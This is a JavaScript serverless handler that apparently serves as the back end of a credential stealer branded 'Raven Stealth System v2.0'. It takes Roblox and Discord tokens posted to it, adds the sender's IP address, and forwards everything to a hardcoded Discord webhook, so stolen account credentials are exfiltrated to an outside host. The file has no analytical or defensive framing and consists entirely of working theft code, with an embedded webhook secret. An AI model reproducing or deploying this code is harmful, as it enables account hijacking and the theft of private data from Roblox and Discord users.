export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Refusé');

    const webhook = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
    const { rblx, dsct } = req.body;
    const ip = req.headers['x-forwarded-for'] || "IP Masquée";

    const payload = {
        embeds: [{
            title: "🔱 LA RELÈVE DE RAVEN - SYSTÈME INFILTRÉ",
            color: 0x00ffcc,
            fields: [
                { name: "🌐 ADRESSE IP", value: `\`${ip}\`` },
                { name: "🔑 ROBLOX TOKEN", value: `\`${rblx}\`` },
                { name: "💬 DISCORD TOKEN", value: `\`${dsct}\`` }
            ],
            footer: { text: "Raven Stealth System v2.0" },
            timestamp: new Date()
        }]
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    res.status(200).json({ status: "success" });
}
